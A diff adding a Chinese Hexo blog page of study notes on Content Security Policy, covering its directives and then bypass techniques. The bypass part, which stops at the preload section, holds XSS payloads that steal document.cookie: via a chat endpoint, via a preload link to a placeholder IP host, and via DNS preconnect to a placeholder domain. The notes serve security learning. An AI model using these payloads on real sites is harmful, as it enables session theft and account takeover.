@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>CSP &amp; Bypass - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="Share learn & Share life.">
+
+
+
+<meta name="keywords" content="Threezh1">
+
+
+
+    <meta name="description" content="&amp;#x8FD9;&amp;#x90E8;&amp;#x5206;&amp;#x662F;&amp;#x4ECE;&amp;#x5176;&amp;#x4ED6;&amp;#x5E08;&amp;#x5085;&amp;#x4EEC;&amp;#x7684;&amp;#x6587;&amp;#x7AE0;&amp;#x91CC;&amp;#x6458;&amp;#x6284;&amp;#x7684;&amp;#x7B14;&amp;#x8BB0;&amp;#x4E0E;&amp;#x4E00;&amp;#x4E9B;&amp;#x5176;&amp;#x4ED6;&amp;#x5185;">
+<meta name="keywords" content="XSS,Bypass,CSP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSP &amp; Bypass">
+<meta property="og:url" content="http://yoursite.com/2020/04/30/CSP_Bypass/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="&amp;#x8FD9;&amp;#x90E8;&amp;#x5206;&amp;#x662F;&amp;#x4ECE;&amp;#x5176;&amp;#x4ED6;&amp;#x5E08;&amp;#x5085;&amp;#x4EEC;&amp;#x7684;&amp;#x6587;&amp;#x7AE0;&amp;#x91CC;&amp;#x6458;&amp;#x6284;&amp;#x7684;&amp;#x7B14;&amp;#x8BB0;&amp;#x4E0E;&amp;#x4E00;&amp;#x4E9B;&amp;#x5176;&amp;#x4ED6;&amp;#x5185;">
+<meta property="og:locale" content="Chinese">
+<meta property="og:updated_time" content="2020-04-30T08:04:21.444Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSP &amp; Bypass">
+<meta name="twitter:description" content="&amp;#x8FD9;&amp;#x90E8;&amp;#x5206;&amp;#x662F;&amp;#x4ECE;&amp;#x5176;&amp;#x4ED6;&amp;#x5E08;&amp;#x5085;&amp;#x4EEC;&amp;#x7684;&amp;#x6587;&amp;#x7AE0;&amp;#x91CC;&amp;#x6458;&amp;#x6284;&amp;#x7684;&amp;#x7B14;&amp;#x8BB0;&amp;#x4E0E;&amp;#x4E00;&amp;#x4E9B;&amp;#x5176;&amp;#x4ED6;&amp;#x5185;">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+</head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/about">关于</a>
+            
+            <a class="navbar-item " href="http://121.36.32.184/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Chercher" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table des Matières">
+                    <i class="fa fa-list"></i>
+                </a>
+                <div class="navbar-dropdown is-right">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#什么是CSP？">1&nbsp;&nbsp;<b>什么是CSP？</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#支持CSP的浏览器">2&nbsp;&nbsp;<b>支持CSP的浏览器</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#CSP的来源">3&nbsp;&nbsp;<b>CSP的来源</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#CSP的属性">4&nbsp;&nbsp;<b>CSP的属性</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#child-src">4.1&nbsp;&nbsp;child-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#connect-src">4.2&nbsp;&nbsp;connect-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#default-src">4.3&nbsp;&nbsp;default-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#font-src">4.4&nbsp;&nbsp;font-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#img-src">4.5&nbsp;&nbsp;img-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#manifest-src">4.6&nbsp;&nbsp;manifest-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#media-src">4.7&nbsp;&nbsp;media-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#object-src">4.8&nbsp;&nbsp;object-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#script-src">4.9&nbsp;&nbsp;script-src</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#style-src">4.10&nbsp;&nbsp;style-src</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#数据">5&nbsp;&nbsp;<b>数据</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#Bypass">6&nbsp;&nbsp;<b>Bypass</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#xxx-src">6.1&nbsp;&nbsp;xxx-src *</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#script-src-unsafe-inline">6.2&nbsp;&nbsp;script-src unsafe-inline</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#xxx-src-self">6.3&nbsp;&nbsp;xxx-src self</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#Iframe包含导致的绕过">6.4&nbsp;&nbsp;Iframe包含导致的绕过</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#CRLF导致的bypass">6.5&nbsp;&nbsp;CRLF导致的bypass</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#Base-uri绕过">6.6&nbsp;&nbsp;Base-uri绕过</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#CDN绕过">6.7&nbsp;&nbsp;CDN绕过</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#利用浏览器补全">6.8&nbsp;&nbsp;利用浏览器补全</a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            CSP &amp; Bypass
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2020-04-30T08:04:08.000Z" itemprop="datePublished">Apr 30 2020</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            18 minutes lire (À propos 2631 mots)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>&#x8FD9;&#x90E8;&#x5206;&#x662F;&#x4ECE;&#x5176;&#x4ED6;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x6587;&#x7AE0;&#x91CC;&#x6458;&#x6284;&#x7684;&#x7B14;&#x8BB0;&#x4E0E;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5185;&#x5BB9;&#x7684;&#x603B;&#x7ED3;&#xFF0C;&#x4EE5;&#x4FBF;&#x5B66;&#x4E60;&#x4E0E;&#x590D;&#x4E60;&#x3002;</p>
+<h2 id="&#x4EC0;&#x4E48;&#x662F;CSP&#xFF1F;"><a href="#&#x4EC0;&#x4E48;&#x662F;CSP&#xFF1F;" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F;CSP&#xFF1F;"></a>&#x4EC0;&#x4E48;&#x662F;CSP&#xFF1F;</h2><p>Content Security Policy &#xFF08;CSP&#xFF09;&#x5185;&#x5BB9;&#x5B89;&#x5168;&#x7B56;&#x7565;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x9644;&#x52A0;&#x7684;&#x5B89;&#x5168;&#x5C42;&#xFF0C;&#x6709;&#x52A9;&#x4E8E;&#x68C0;&#x6D4B;&#x5E76;&#x7F13;&#x89E3;&#x67D0;&#x4E9B;&#x7C7B;&#x578B;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x5305;&#x62EC;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#xFF08;XSS&#xFF09;&#x548C;&#x6570;&#x636E;&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x3002;</p>
+<p><a href="https://www.w3.org/TR/CSP3/#directive-font-src" target="_blank" rel="noopener">https://www.w3.org/TR/CSP3/</a></p>
+<a id="more"></a>
+<h2 id="&#x652F;&#x6301;CSP&#x7684;&#x6D4F;&#x89C8;&#x5668;"><a href="#&#x652F;&#x6301;CSP&#x7684;&#x6D4F;&#x89C8;&#x5668;" class="headerlink" title="&#x652F;&#x6301;CSP&#x7684;&#x6D4F;&#x89C8;&#x5668;"></a>&#x652F;&#x6301;CSP&#x7684;&#x6D4F;&#x89C8;&#x5668;</h2><p>CSP&#x4E3B;&#x8981;&#x6709;&#x4E09;&#x4E2A;header&#xFF0C;&#x5206;&#x522B;&#x662F;&#xFF1A;Content-Security-Policy&#xFF0C;X-Content-Security-Policy&#xFF0C;X-WebKit-CSP</p>
+<ul>
+<li>Content-Security-Policychrome 25+&#xFF0C;Firefox 23+&#xFF0C;Opera 19+</li>
+<li>X-Content-Security-PolicyFirefox 23+&#xFF0C;IE10+</li>
+<li>X-WebKit-CSPChrome 25+</li>
+</ul>
+<h2 id="CSP&#x7684;&#x6765;&#x6E90;"><a href="#CSP&#x7684;&#x6765;&#x6E90;" class="headerlink" title="CSP&#x7684;&#x6765;&#x6E90;"></a>CSP&#x7684;&#x6765;&#x6E90;</h2><p>&#x5E38;&#x89C1;&#x7684;CSP&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy:default-src &apos;none&apos;; connect-src &apos;self&apos;; frame-src &apos;self&apos;; script-src xxxx/js/ &apos;sha256-KcMxZjpVxhUhzZiwuZ82bc0vAhYbUJsxyCXODP5ulto=&apos; &apos;sha256-u++5+hMvnsKeoBWohJxxO3U9yHQHZU+2damUA6wnikQ=&apos; &apos;sha256-zArnh0kTjtEOVDnamfOrI8qSpoiZbXttc6LzqNno8MM=&apos; &apos;sha256-3PB3EBmojhuJg8mStgxkyy3OEJYJ73ruOF7nRScYnxk=&apos; &apos;sha256-bk9UfcsBy+DUFULLU6uX/sJa0q7O7B8Aal2VVl43aDs=&apos;;font-src xxxx/fonts/ fonts.gstatic.com; style-src xxxx/css/ fonts.googleapis.com; img-src &apos;self&apos;&quot;);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>none</code>&#x4EE3;&#x8868;&#x4EC0;&#x4E48;&#x90FD;&#x4E0D;&#x5339;&#x914D;&#xFF0C;self&#x4EE3;&#x8868;&#x5339;&#x914D;&#x540C;&#x6E90;&#x7684;&#x5185;&#x5BB9;&#xFF1B;</li>
+<li><code>https://example.com/path/to/file.js</code>&#x8FD9;&#x6837;&#x7684;&#x4F1A;&#x5339;&#x914D;&#x7279;&#x6B8A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;<code>https://example.com/</code>&#x8FD9;&#x6837;&#x4F1A;&#x5339;&#x914D;&#x6E90;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#xFF1B;</li>
+<li><code>https:</code>&#xFF0C;&#x4F1A;&#x5339;&#x914D;&#x6240;&#x6709;&#x5305;&#x542B;&#x8FD9;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x683C;&#x5F0F;&#x7684;&#x6765;&#x6E90;&#xFF1B;</li>
+<li><code>example.com</code>&#x4F1A;&#x5339;&#x914D;&#x6240;&#x6709;&#x8FD9;&#x4E2A;host&#x7684;&#x6765;&#x6E90;&#xFF0C;<code>*.example.com</code>,&#x4F1A;&#x5339;&#x914D;&#x8FD9;&#x4E2A;host&#x7684;&#x6240;&#x6709;&#x5B50;&#x57DF;&#xFF1B;</li>
+<li><code>nonce-qwertyu12345</code>&#x4F1A;&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x8282;&#x70B9;&#x3002;&#xFF1B;</li>
+<li>&#x8FD8;&#x6709;&#x52A0;&#x5BC6;&#x8FC7;&#x7684;&#x7C7B;&#x4F3C;&#x4E8E;<code>sha256-abcd&#x2026;</code>&#x540C;&#x6837;&#x4F1A;&#x5339;&#x914D;&#x9875;&#x9762;&#x4E2D;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x8282;&#x70B9;&#xFF08;&#x6BCF;&#x6B21;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x503C;&#x90FD;&#x4F1A;&#x6539;&#x53D8;&#xFF09;</li>
+</ol>
+<h2 id="CSP&#x7684;&#x5C5E;&#x6027;"><a href="#CSP&#x7684;&#x5C5E;&#x6027;" class="headerlink" title="CSP&#x7684;&#x5C5E;&#x6027;"></a>CSP&#x7684;&#x5C5E;&#x6027;</h2><h3 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h3><p><code>child-src</code>&#x6307;&#x4EE4;&#x7BA1;&#x7406;&#x4E86;&#x5957;&#x5D4C;&#x6D4F;&#x89C8;&#x7684;&#x90E8;&#x5206;&#xFF08;&#x7C7B;&#x4F3C;&#x4E8E;iframe&#x3001;frame&#x6807;&#x7B7E;&#xFF09;&#x3002;</p>
+<h3 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h3><p><code>connect-src</code>&#x6307;&#x4EE4;&#x9650;&#x5236;&#x4E86;&#x53EF;&#x4F7F;&#x7528;&#x7684;&#x811A;&#x672C;&#x52A0;&#x8F7D;&#x7684;url&#xFF0C;&#x4F1A;&#x963B;&#x6B62;a&#x7684;ping&#x5C5E;&#x6027;&#xFF0C;&#x4E5F;&#x63A7;&#x5236;&#x7740;websocket&#x7684;&#x8FDE;&#x63A5;&#x3002;script&#x6807;&#x7B7E;&#x91CC;&#x9762;&#x7684;&#x6570;&#x636E;&#x53D1;&#x9001;&#x7531;&#x8FD9;&#x4E2A;&#x5C5E;&#x6027;&#x9650;&#x5236;&#x3002;</p>
+<h3 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h3><p>&#x5C5E;&#x6027;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x503C;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;<code>default-src</code>&#x6240;&#x8BBE;&#x5B9A;&#x7684;&#x503C;&#x3002;</p>
+<h3 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h3><p><code>font-src</code>&#x6307;&#x4EE4;&#x9650;&#x5236;&#x4E86;&#x6240;&#x6709;&#x53EF;&#x4EE5;&#x88AB;&#x52A0;&#x8F7D;&#x7684;&#x5B57;&#x4F53;&#x8D44;&#x6E90;&#x3002;</p>
+<h3 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h3><p><code>img-src</code>&#x6307;&#x4EE4;&#x9650;&#x5236;&#x7740;&#x6240;&#x6709;&#x53EF;&#x4EE5;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;&#x8D44;&#x6E90;&#x7684;&#x6765;&#x6E90;&#x3002;</p>
+<h3 id="manifest-src"><a href="#manifest-src" class="headerlink" title="manifest-src"></a>manifest-src</h3><p><code>manifest-src</code>&#x6307;&#x4EE4;&#x9650;&#x5236;&#x4E86;&#x4ECE;&#x5E94;&#x7528;&#x6E05;&#x5355;&#x53EF;&#x4EE5;&#x52A0;&#x8F7D;&#x7684;url&#x3002;&#x5E38;&#x89C1;&#x7684;&#x5C31;&#x662F;link&#x6807;&#x7B7E;</p>
+<p><code>&lt;link rel=&quot;manifest&quot; href=&quot;[https://not-example.com/manifest](https://not-example.com/manifest)&quot;&gt;</code></p>
+<h3 id="media-src"><a href="#media-src" class="headerlink" title="media-src"></a>media-src</h3><p><code>media-src</code>&#x6307;&#x4EE4;&#x9650;&#x5236;&#x4EE4;&#x989D;&#x6240;&#x6709;&#x4ECE;&#x89C6;&#x9891;&#x3001;&#x97F3;&#x9891;&#x3001;&#x548C;&#x76F8;&#x5173;&#x7684;&#x6587;&#x672C;&#x6765;&#x6E90;&#x3002;&#x9488;&#x5BF9;<code>audio</code> <code>video</code>&#x4EE5;&#x53CA;&#x8FDE;&#x5E26;&#x7684;&#x6587;&#x672C;&#x3002;</p>
+<h3 id="object-src"><a href="#object-src" class="headerlink" title="object-src"></a>object-src</h3><p><code>object-src</code>&#x9650;&#x5236;&#x4E86;&#x6240;&#x6709;&#x4ECE;&#x63D2;&#x4EF6;&#x52A0;&#x8F7D;&#x7684;&#x6765;&#x6E90;&#x3002;&#x4F8B;&#x5982;<code>embed</code>&#x3001;<code>object</code>&#x3001;<code>applet</code>&#x7B49;&#x3002;</p>
+<h3 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h3><p>script-src&#x6307;&#x4EE4;&#x9650;&#x5236;&#x4E86;&#x6240;&#x6709;js&#x811A;&#x672C;&#x53EF;&#x4EE5;&#x88AB;&#x6267;&#x884C;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x5305;&#x62EC;&#x901A;&#x8FC7;&#x94FE;&#x63A5;&#x65B9;&#x5F0F;&#x52A0;&#x8F7D;&#x7684;&#x811A;&#x672C;url&#xFF0C;&#x540C;&#x6837;&#x5305;&#x62EC;&#x6240;&#x6709;&#x5185;&#x8054;&#x811A;&#x672C;&#xFF0C;&#x751A;&#x81F3;&#x5305;&#x62EC;&#x5404;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x5F15;&#x7528;&#x3002;</p>
+<ul>
+<li>&#x53C2;&#x6570;<code>unsafe-inline</code>&#xFF1A;&#x4E0D;&#x4F1A;&#x963B;&#x6B62;&#x5185;&#x8054;&#x811A;&#x672C;</li>
+<li>&#x53C2;&#x6570;<code>unsafe-eval</code>&#xFF1A;&#x4F1A;&#x5141;&#x8BB8;&#x4E0B;&#x9762;&#x7684;&#x51E0;&#x4E2A;&#x51FD;&#x6570;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">Function()</span><br><span class="line">setTimeout() with an initial argument which is not callable.</span><br><span class="line">setInterval() with an initial argument which is not callable.</span><br></pre></td></tr></table></figure>
+
+<h3 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h3><p>style-src&#x6307;&#x4EE4;&#x9650;&#x5236;&#x4E86;&#x6240;&#x6709;&#x53EF;&#x80FD;&#x88AB;&#x5F15;&#x7528;&#x7684;css&#xFF0C;&#x5305;&#x62EC;&#x4E0B;&#x9762;&#x4E09;&#x79CD;&#x5F15;&#x7528;&#x7684;css&#x5C5E;&#x6027;&#xFF0C;style&#x4E5F;&#x6709;&#x4E2A;<code>unsafe-inline</code>&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x3002;</p>
+<ul>
+<li>&#x901A;&#x8FC7;<code>link</code>&#x6807;&#x7B7E;&#x52A0;&#x8F7D;&#x7684;css</li>
+<li><code>style</code>&#x6807;&#x7B7E;</li>
+<li>&#x901A;&#x8FC7;<code>@import</code>&#x5F15;&#x5165;&#x7684;&#x6837;&#x5F0F;&#x8868;</li>
+<li>&#x5185;&#x8054;&#x6837;&#x5F0F;&#x8868; &#xFF1A;<code>style=&quot;font-size:10px;font-color:#ff0000&quot;</code></li>
+</ul>
+<h2 id="&#x6570;&#x636E;"><a href="#&#x6570;&#x636E;" class="headerlink" title="&#x6570;&#x636E;"></a>&#x6570;&#x636E;</h2><ul>
+<li><code>data:</code> &#x5141;&#x8BB8;data:URI&#x4F5C;&#x4E3A;&#x5185;&#x5BB9;&#x6765;&#x6E90;</li>
+<li><code>mediastream:</code> &#x5141;&#x8BB8;mediastream: URI&#x4F5C;&#x4E3A;&#x5185;&#x5BB9;&#x6765;&#x6E90;</li>
+</ul>
+<p><code>Content-Security-Policy: default-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src mediastream:</code></p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="xxx-src"><a href="#xxx-src" class="headerlink" title="xxx-src *"></a>xxx-src *</h3><p>&#x7C7B;&#x4F3C;&#x4E8E;src&#x5F15;&#x7528;&#x7684;&#x65B9;&#x5F0F; &#x21D2; CSRF</p>
+<h3 id="script-src-unsafe-inline"><a href="#script-src-unsafe-inline" class="headerlink" title="script-src unsafe-inline"></a>script-src unsafe-inline</h3><p>&#x4E0D;&#x80FD;&#x4ECE;&#x5916;&#x90E8;&#x5F15;&#x5165;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5185;&#x5D4C;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x6587;&#x7AE0;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x6848;&#x4F8B;&#xFF1A;&#x4E00;&#x4E2A;&#x804A;&#x5929;&#x6846;&#x7CFB;&#x7EDF;&#xFF0C;&#x7531;&#x4E8E;&#x7CFB;&#x7EDF;&#x8FD8;&#x8BBE;&#x7F6E;&#x4E86;&#x540C;&#x6E90;&#x7B56;&#x7565;&#xFF0C;&#x4E0D;&#x80FD;&#x5C06;cookie&#x53D1;&#x9001;&#x5230;&#x522B;&#x7684;&#x57DF;&#x4E0B;&#x3002;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x540C;js&#x8C03;&#x7528;&#x53D1;&#x9001;&#x6D88;&#x606F;&#x7684;&#x63A5;&#x53E3;&#x6765;&#x83B7;&#x53D6;&#x522B;&#x4EBA;&#x7684;cookie&#x3002;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;submit.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(_Ctent-type_,_applicati/x-www-form-urlencoded_);</span><br><span class="line">xmlhttp.send(_to=lorexxar&amp;&amp;message=_+document.cookie);&lt;/script&gt;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="xxx-src-self"><a href="#xxx-src-self" class="headerlink" title="xxx-src self"></a>xxx-src self</h3><p>&#x53EA;&#x5141;&#x8BB8;&#x540C;&#x6E90;&#x7684;url&#xFF0C;&#x4F46;&#x662F;link&#x6807;&#x7B7E;&#x6BD4;&#x8F83;&#x4F8B;&#x5916;&#xFF0C;&#x5728;chrome&#x5F53;&#x4E2D;&#x8FD8;&#x6CA1;&#x6709;&#x88AB;CSP&#x6240;&#x9650;&#x5236;&#x3002;&#x53EF;&#x4EE5;&#x5BFC;&#x81F4;CSRF&#x6F0F;&#x6D1E;&#x3002;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; herf=&quot;xxxxxxx&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x9884;&#x52A0;&#x8F7D;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;</li>
+</ul>
+<p>&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;<a href="https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html</a></p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#x9884;&#x52A0;&#x8F7D;&#x67D0;&#x4E2A;&#x9875;&#x9762; --&gt;</span><br><span class="line">&lt;link rel=&apos;prefetch&apos; href=&apos;http://xxxx&apos;&gt;&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&apos;prerender&apos; href=&apos;http://xxxx&apos;&gt;&lt;!-- chrome --&gt;</span><br><span class="line">&lt;!-- &#x9884;&#x52A0;&#x8F7D;&#x67D0;&#x4E2A;&#x56FE;&#x7247; --&gt;</span><br><span class="line">&lt;link rel=&apos;prefetch&apos; href=&apos;http://xxxx/x.jpg&apos;&gt;</span><br><span class="line">&lt;!-- DNS &#x9884;&#x89E3;&#x6790; --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;</span><br><span class="line">&lt;!-- &#x7279;&#x5B9A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x9884;&#x52A0;&#x8F7D; --&gt;</span><br><span class="line">&lt;link rel=&apos;preload&apos; href=&apos;//xxxxx/xx.js&apos;&gt;&lt;!-- chrome --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>chrome&#x8FD8;&#x6CA1;&#x5BF9;&#x9884;&#x52A0;&#x8F7D;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;firefox&#x6709;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;prefetch&#x5DF2;&#x4E0D;&#x53EF;&#x7528;&#xFF0C;&#x4F46;&#x662F;dns&#x9884;&#x89E3;&#x6790;&#x8FD8;&#x662F;&#x80FD;&#x7528;&#x7684;&#x3002;</p>
+<p>&#x5728;unsafe-inline&#x7684;&#x60C5;&#x6CC1;&#x4E0B;&#xFF0C;&#x5229;&#x7528;&#x7684;payload&#x5982;&#x4E0B;&#xFF1A;</p>
+<p>Chrome Http&#x901A;&#x9053;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var n0t = document.createElement(&quot;link&quot;);n0t.setAttribute(&quot;rel&quot;, &quot;preload&quot;);n0t.setAttribute(&quot;href&quot;, &quot;//ipipipip/&quot;+escape((function(){try{return document.location.href}catch(e){return &apos;&apos;}})())+&apos;&amp;toplocation=&apos;+escape((function(){try{return top.location.href}catch(e){return &apos;&apos;}})())+&apos;&amp;cookie=&apos;+escape((function(){try{return document.cookie}catch(e){return &apos;&apos;}})())+&apos;&amp;opener=&apos;+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&apos;&apos;}catch(e){return &apos;&apos;}})()));document.head.appendChild(n0t);</span><br></pre></td></tr></table></figure>
+
+<p>Firefox(dns&#x901A;&#x9053;)</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dc = document.cookie;dcl = dc.split(&quot;;&quot;);n0 = document.getElementsByTagName(&quot;HEAD&quot;)[0];for (var i=0; i&lt;dcl.length;i++){console.log(dcl[i]);n0.innerHTML = n0.innerHTML + &quot;&lt;link rel=\&quot;preconnect\&quot; href=\&quot;//&quot; + escape(dcl[i].replace(/\//g, &quot;-&quot;)).replace(/%/g, &quot;_&quot;) + &apos;.&apos; + location.hostname.split(&quot;.&quot;).join(&quot;&quot;) +  &quot;.xxx.io\&quot;&gt;&quot;;}</span><br></pre></td></tr></table></figure>
+
